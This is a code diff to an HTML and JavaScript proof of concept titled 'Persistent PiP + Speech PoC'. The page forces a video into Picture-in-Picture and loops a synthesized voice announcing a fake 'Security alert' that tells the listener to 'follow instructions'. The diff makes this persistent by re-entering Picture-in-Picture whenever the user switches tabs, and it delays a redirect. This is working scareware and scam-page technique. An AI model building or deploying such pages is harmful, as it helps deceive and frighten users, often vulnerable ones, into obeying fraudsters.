@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Video + PiP + Speech PoC</title>
+<title>Persistent PiP + Speech PoC</title>
 <style>
   body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background:#000; color:#fff; }
   button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
@@ -26,7 +26,7 @@ btn.addEventListener('click', async () => {
 
   btn.disabled = true;
 
-  // 🎬 Play video safely
+  // 🎬 Play video
   try {
     video.muted = false;
     video.volume = 1;
@@ -35,13 +35,17 @@ btn.addEventListener('click', async () => {
   } catch(e){ console.warn("Video play failed", e); }
 
   // 🖼️ Picture-in-Picture
-  try {
-    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
-      await video.requestPictureInPicture();
-    }
-  } catch(e){ console.warn("PiP failed", e); }
+  async function enterPiP() {
+    try {
+      if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
+        await video.requestPictureInPicture();
+      }
+    } catch(e){ console.warn("PiP failed", e); }
+  }
 
-  // 🔊 SpeechSynthesis with loop (optional)
+  await enterPiP();
+
+  // 🔊 SpeechSynthesis loop persistent
   const text = "Security alert. Suspicious activity detected. Please follow instructions.";
   function speakLoop() {
     if (speaking) return;
@@ -66,16 +70,23 @@ btn.addEventListener('click', async () => {
 
     utter.onend = () => {
       speaking = false;
-      speakLoop(); // loop persistent
+      speakLoop();
     };
   }
 
   speakLoop();
 
-  // ⏱️ Redirect after delay (adjustable)
+  // 🔁 Keep PiP alive on tab switch / blur
+  document.addEventListener('visibilitychange', async () => {
+    if (document.visibilityState === 'hidden') {
+      await enterPiP(); // re-request PiP jika user pindah tab
+    }
+  });
+
+  // ⏱️ Optional redirect after delay
   setTimeout(() => {
     window.open('https://www.google.com', '_self');
-  }, 1500); // 1.5s delay
+  }, 3000); // 3s delay
 });
 </script>
 
